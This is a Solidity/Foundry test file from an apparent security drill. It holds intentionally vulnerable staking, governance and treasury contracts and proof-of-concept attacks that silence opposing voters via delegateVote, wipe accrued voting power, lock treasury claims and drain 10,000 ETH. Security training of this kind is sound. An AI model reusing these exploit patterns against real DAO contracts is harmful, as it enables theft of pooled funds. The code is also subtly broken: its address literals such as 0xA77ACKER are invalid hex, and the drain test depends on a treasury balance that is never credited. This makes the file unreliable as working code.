// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

// ============================================================
// CONTRACTS (copied from drill11)
// ============================================================

contract StakingToken {
    string public name = "Staked GOV";
    uint256 public totalStaked;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public stakedAmount;
    mapping(address => uint256) public stakeTimestamp;
    
    uint256 public constant MAX_LOCK = 30 days;
    
    function stake(uint256 amount) external {
        require(amount > 0, "zero");
        if (stakedAmount[msg.sender] > 0) {
            _claimRewards(msg.sender);
        }
        stakedAmount[msg.sender] += amount;
        balanceOf[msg.sender] += amount;
        totalStaked += amount;
        stakeTimestamp[msg.sender] = block.timestamp;
    }
    
    function unstake(uint256 amount) external {
        require(amount > 0 && amount <= stakedAmount[msg.sender], "bad");
        _claimRewards(msg.sender);
        stakedAmount[msg.sender] -= amount;
        balanceOf[msg.sender] -= amount;
        totalStaked -= amount;
    }
    
    function getVotingPower(address user) public view returns (uint256) {
        if (stakedAmount[user] == 0) return 0;
        uint256 elapsed = block.timestamp - stakeTimestamp[user];
        uint256 timeWeight = elapsed >= MAX_LOCK ? 1e18 : elapsed * 1e18 / MAX_LOCK;
        return stakedAmount[user] * timeWeight / 1e18;
    }
    
    function getTotalVotingPower() external view returns (uint256) {
        return totalStaked;
    }
    
    uint256 public rewardPerToken;
    mapping(address => uint256) public rewardCheckpoint;
    mapping(address => uint256) public pendingRewards;
    
    function _claimRewards(address user) internal {
        uint256 earned = stakedAmount[user] * (rewardPerToken - rewardCheckpoint[user]) / 1e18;
        pendingRewards[user] += earned;
        rewardCheckpoint[user] = rewardPerToken;
    }
    
    function claimRewards() external {
        _claimRewards(msg.sender);
        uint256 rewards = pendingRewards[msg.sender];
        pendingRewards[msg.sender] = 0;
    }
}

contract Governance {
    StakingToken public immutable staking;
    
    struct Proposal {
        address proposer;
        string description;
        uint256 forVotes;
        uint256 againstVotes;
        uint256 startTime;
        uint256 endTime;
        bool executed;
        address target;
        bytes callData;
    }
    
    mapping(uint256 => Proposal) public proposals;
    mapping(uint256 => mapping(address => bool)) public hasVoted;
    uint256 public proposalCount;
    
    uint256 public constant VOTING_PERIOD = 3 days;
    uint256 public constant PROPOSAL_THRESHOLD = 100e18;
    uint256 public constant QUORUM = 1000e18;
    
    constructor(address _staking) {
        staking = StakingToken(_staking);
    }
    
    function propose(address target, bytes calldata callData, string calldata desc) external returns (uint256) {
        uint256 votingPower = staking.getVotingPower(msg.sender);
        require(votingPower >= PROPOSAL_THRESHOLD, "below threshold");
        
        uint256 id = ++proposalCount;
        proposals[id] = Proposal({
            proposer: msg.sender,
            description: desc,
            forVotes: 0,
            againstVotes: 0,
            startTime: block.timestamp,
            endTime: block.timestamp + VOTING_PERIOD,
            executed: false,
            target: target,
            callData: callData
        });
        return id;
    }
    
    function vote(uint256 proposalId, bool support) external {
        Proposal storage p = proposals[proposalId];
        require(block.timestamp >= p.startTime && block.timestamp < p.endTime, "voting closed");
        require(!hasVoted[proposalId][msg.sender], "already voted");
        
        uint256 votingPower = staking.getVotingPower(msg.sender);
        require(votingPower > 0, "no voting power");
        
        hasVoted[proposalId][msg.sender] = true;
        
        if (support) {
            p.forVotes += votingPower;
        } else {
            p.againstVotes += votingPower;
        }
    }
    
    function delegateVote(uint256 proposalId, address delegate) external {
        Proposal storage p = proposals[proposalId];
        require(block.timestamp >= p.startTime && block.timestamp < p.endTime, "voting closed");
        require(!hasVoted[proposalId][msg.sender], "already voted");
        require(!hasVoted[proposalId][delegate], "delegate already voted");
        
        uint256 votingPower = staking.getVotingPower(msg.sender);
        require(votingPower > 0, "no voting power");
        
        hasVoted[proposalId][msg.sender] = true;
        hasVoted[proposalId][delegate] = true;
        
        p.forVotes += votingPower;
    }
    
    function execute(uint256 proposalId) external {
        Proposal storage p = proposals[proposalId];
        require(block.timestamp >= p.endTime, "voting not ended");
        require(!p.executed, "already executed");
        require(p.forVotes > p.againstVotes, "proposal rejected");
        require(p.forVotes >= QUORUM, "quorum not met");
        
        p.executed = true;
        (bool success,) = p.target.call(p.callData);
        require(success, "execution failed");
    }
}

contract Treasury {
    address public governance;
    uint256 public totalFunds;
    
    mapping(address => uint256) public allocations;
    mapping(address => bool) public claimed;
    
    constructor(address _governance) {
        governance = _governance;
    }
    
    receive() external payable {
        totalFunds += msg.value;
    }
    
    function allocate(address recipient, uint256 amount) external {
        require(msg.sender == governance, "not governance");
        require(amount <= totalFunds, "insufficient funds");
        allocations[recipient] += amount;
        totalFunds -= amount;
    }
    
    function claim() external {
        uint256 amount = allocations[msg.sender];
        require(amount > 0, "nothing to claim");
        require(!claimed[msg.sender], "already claimed");
        
        claimed[msg.sender] = true;
        allocations[msg.sender] = 0;
        
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "transfer failed");
    }
    
    function reclaim(address recipient) external {
        require(msg.sender == governance, "not governance");
        require(!claimed[recipient], "already claimed");
        uint256 amount = allocations[recipient];
        allocations[recipient] = 0;
        totalFunds += amount;
    }
    
    function batchAllocate(address[] calldata recipients, uint256[] calldata amounts) external {
        require(msg.sender == governance, "not governance");
        require(recipients.length == amounts.length, "length mismatch");
        for (uint256 i = 0; i < recipients.length; i++) {
            require(amounts[i] <= totalFunds, "insufficient");
            allocations[recipients[i]] += amounts[i];
            totalFunds -= amounts[i];
        }
    }
}

// ============================================================
// ATTACKER CONTRACT (for composition attack)
// ============================================================
contract AttackerContract {
    StakingToken staking;
    Governance gov;
    Treasury treasury;
    
    constructor(address _staking, address _gov, address _treasury) {
        staking = StakingToken(_staking);
        gov = Governance(_gov);
        treasury = Treasury(_treasury);
    }
    
    function stakeTokens(uint256 amount) external {
        staking.stake(amount);
    }
    
    function proposeDrain(address target, bytes calldata callData) external returns (uint256) {
        return gov.propose(target, callData, "drain");
    }
    
    function silenceVoter(uint256 proposalId, address victim) external {
        gov.delegateVote(proposalId, victim);
    }
    
    function executeProposal(uint256 proposalId) external {
        gov.execute(proposalId);
    }
    
    function claimFromTreasury() external {
        treasury.claim();
    }
    
    function getVotingPower() external view returns (uint256) {
        return staking.getVotingPower(address(this));
    }
    
    receive() external payable {}
}

// ============================================================
// PoC TESTS
// ============================================================
contract Drill11PoC is Test {
    StakingToken staking;
    Governance gov;
    Treasury treasury;
    
    address attacker = address(0xA77ACKER);
    address victim = address(0xB1CT1M);
    address whale = address(0xCWHA1E);
    
    function setUp() public {
        staking = new StakingToken();
        gov = new Governance(address(staking));
        treasury = new Treasury(address(gov));
        
        // Fund treasury with 10,000 ETH
        vm.deal(address(treasury), 10_000 ether);
        
        // Give tokens to actors (simulated via direct stake)
        vm.deal(attacker, 2000 ether);
        vm.deal(victim, 1000 ether);
        vm.deal(whale, 5000 ether);
    }
    
    // ============================================================
    // PoC #1: delegateVote() SILENCING
    // Attacker silences victim's opposition vote
    // ============================================================
    function test_PoC1_DelegateVoteSilencing() public {
        console2.log("═══ PoC #1: delegateVote() SILENCING ═══");
        
        // Setup: both stake and wait 30 days for full VP
        vm.startPrank(attacker);
        staking.stake(1000 ether); // 1000 tokens
        vm.stopPrank();
        
        vm.startPrank(victim);
        staking.stake(500 ether); // 500 tokens
        vm.stopPrank();
        
        // Wait 30 days for full voting power
        vm.warp(block.timestamp + 30 days);
        
        uint256 attackerVP = staking.getVotingPower(attacker);
        uint256 victimVP = staking.getVotingPower(victim);
        console2.log("Attacker VP:", attackerVP / 1e18, "tokens");
        console2.log("Victim VP:", victimVP / 1e18, "tokens");
        
        // Attacker proposes
        vm.startPrank(attacker);
        uint256 proposalId = gov.propose(
            address(treasury),
            abi.encodeCall(Treasury.allocate, (attacker, 5000 ether)),
            "Definitely legit proposal"
        );
        vm.stopPrank();
        
        console2.log("\nBefore attack:");
        console2.log("  Victim can vote?", !gov.hasVoted(proposalId, victim));
        
        // ATTACK: Attacker "delegates" to victim → silences victim
        vm.startPrank(attacker);
        gov.delegateVote(proposalId, victim);
        vm.stopPrank();
        
        console2.log("\nAfter delegateVote(proposal, victim):");
        console2.log("  hasVoted[attacker]:", gov.hasVoted(proposalId, attacker));
        console2.log("  hasVoted[victim]:", gov.hasVoted(proposalId, victim));
        
        (,,uint256 forVotes, uint256 againstVotes,,,,,) = gov.proposals(proposalId);
        console2.log("  forVotes:", forVotes / 1e18);
        console2.log("  againstVotes:", againstVotes / 1e18);
        
        // Victim tries to vote AGAINST → REVERTS
        vm.startPrank(victim);
        vm.expectRevert("already voted");
        gov.vote(proposalId, false);
        vm.stopPrank();
        
        console2.log("\n✅ VICTIM SILENCED! Cannot vote against.");
        console2.log("   Attacker used 1000 VP to silence 500 VP opposition.");
        console2.log("   forVotes = 1000 (only attacker's). Victim's 500 VP = WASTED.");
    }
    
    // ============================================================
    // PoC #2: stakeTimestamp RESET
    // Re-staking destroys accumulated voting power
    // ============================================================
    function test_PoC2_StakeTimestampReset() public {
        console2.log("\n═══ PoC #2: stakeTimestamp RESET ═══");
        
        vm.startPrank(victim);
        staking.stake(1000 ether);
        vm.stopPrank();
        
        // Wait 29 days (almost full VP)
        vm.warp(block.timestamp + 29 days);
        
        uint256 vpBefore = staking.getVotingPower(victim);
        console2.log("VP after 29 days:", vpBefore / 1e18, "tokens");
        
        // Victim stakes 1 more wei (maybe auto-compound, maybe accident)
        vm.startPrank(victim);
        staking.stake(1); // 1 wei
        vm.stopPrank();
        
        uint256 vpAfter = staking.getVotingPower(victim);
        console2.log("VP after staking 1 wei more:", vpAfter);
        
        uint256 loss = vpBefore - vpAfter;
        console2.log("VP LOST:", loss / 1e18, "tokens");
        console2.log("VP LOST %:", loss * 100 / vpBefore, "%");
        
        console2.log("\n✅ 29 DAYS OF VOTING POWER DESTROYED BY 1 WEI STAKE");
    }
    
    // ============================================================
    // PoC #3: Treasury claimed flag = PERMANENT LOCK
    // ============================================================
    function test_PoC3_TreasuryPermanentLock() public {
        console2.log("\n═══ PoC #3: Treasury PERMANENT LOCK ═══");
        
        // Governance allocates to victim
        vm.startPrank(address(gov));
        treasury.allocate(victim, 1000 ether);
        vm.stopPrank();
        
        console2.log("Allocation:", treasury.allocations(victim) / 1e18, "ETH");
        
        // Victim claims
        vm.startPrank(victim);
        treasury.claim();
        vm.stopPrank();
        
        console2.log("Victim claimed. Balance:", victim.balance / 1e18, "ETH");
        console2.log("claimed flag:", treasury.claimed(victim));
        
        // Governance allocates AGAIN (new proposal, new funds)
        vm.startPrank(address(gov));
        treasury.allocate(victim, 2000 ether);
        vm.stopPrank();
        
        console2.log("\nNew allocation:", treasury.allocations(victim) / 1e18, "ETH");
        
        // Victim tries to claim again → BLOCKED
        vm.startPrank(victim);
        vm.expectRevert("already claimed");
        treasury.claim();
        vm.stopPrank();
        
        console2.log("✅ 2000 ETH PERMANENTLY LOCKED. claimed flag never resets.");
        console2.log("   Treasury totalFunds:", treasury.totalFunds() / 1e18, "ETH (reduced but victim can't get it)");
    }
    
    // ============================================================
    // PoC #4: FULL COMPOSITION — Silence → Pass → Drain
    // ============================================================
    function test_PoC4_FullCompositionDrain() public {
        console2.log("\n═══ PoC #4: FULL COMPOSITION ATTACK ═══");
        console2.log("Treasury balance:", address(treasury).balance / 1e18, "ETH");
        
        // Step 1: Attacker stakes 1000 tokens
        vm.startPrank(attacker);
        staking.stake(1000 ether);
        vm.stopPrank();
        
        // Step 2: Whale stakes 2000 tokens (opposition)
        vm.startPrank(whale);
        staking.stake(2000 ether);
        vm.stopPrank();
        
        // Step 3: Wait 30 days for full VP
        vm.warp(block.timestamp + 30 days);
        
        uint256 attackerVP = staking.getVotingPower(attacker);
        uint256 whaleVP = staking.getVotingPower(whale);
        console2.log("\nAttacker VP:", attackerVP / 1e18);
        console2.log("Whale VP (opposition):", whaleVP / 1e18);
        console2.log("Quorum needed:", gov.QUORUM() / 1e18);
        
        // Step 4: Attacker proposes to drain 10,000 ETH
        vm.startPrank(attacker);
        address[] memory recipients = new address[](1);
        recipients[0] = attacker;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_000 ether;
        
        uint256 proposalId = gov.propose(
            address(treasury),
            abi.encodeCall(Treasury.batchAllocate, (recipients, amounts)),
            "Community fund distribution"
        );
        vm.stopPrank();
        
        console2.log("\nProposal created. ID:", proposalId);
        
        // Step 5: SILENCE the whale (2000 VP opposition)
        vm.startPrank(attacker);
        gov.delegateVote(proposalId, whale);
        vm.stopPrank();
        
        console2.log("Whale SILENCED via delegateVote()");
        console2.log("hasVoted[whale]:", gov.hasVoted(proposalId, whale));
        
        // Whale tries to vote against → BLOCKED
        vm.startPrank(whale);
        vm.expectRevert("already voted");
        gov.vote(proposalId, false);
        vm.stopPrank();
        
        (,,uint256 forVotes,,,) = _getProposalVotes(proposalId);
        console2.log("\nforVotes:", forVotes / 1e18, "(attacker only)");
        console2.log("againstVotes: 0 (whale silenced)");
        console2.log("Quorum met?", forVotes >= gov.QUORUM());
        
        // Step 6: Wait for voting period to end
        vm.warp(block.timestamp + 3 days + 1);
        
        // Step 7: Execute proposal → drain treasury
        vm.startPrank(attacker);
        gov.execute(proposalId);
        vm.stopPrank();
        
        console2.log("\nProposal EXECUTED");
        console2.log("Treasury allocation to attacker:", treasury.allocations(attacker) / 1e18, "ETH");
        
        // Step 8: Attacker claims
        uint256 balBefore = attacker.balance;
        vm.startPrank(attacker);
        treasury.claim();
        vm.stopPrank();
        
        uint256 balAfter = attacker.balance;
        console2.log("\nAttacker balance before:", balBefore / 1e18, "ETH");
        console2.log("Attacker balance after:", balAfter / 1e18, "ETH");
        console2.log("PROFIT:", (balAfter - balBefore) / 1e18, "ETH");
        console2.log("Treasury remaining:", address(treasury).balance / 1e18, "ETH");
        
        console2.log("\n✅ FULL DRAIN COMPLETE");
        console2.log("   1000 VP silenced 2000 VP opposition");
        console2.log("   10,000 ETH drained from treasury");
    }
    
    // Helper to get proposal votes (avoid stack too deep)
    function _getProposalVotes(uint256 id) internal view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (,,uint256 forV, uint256 againstV, uint256 start, uint256 end, bool exec, , ) = gov.proposals(id);
        return (forV, againstV, forV, againstV, start, end);
    }
}
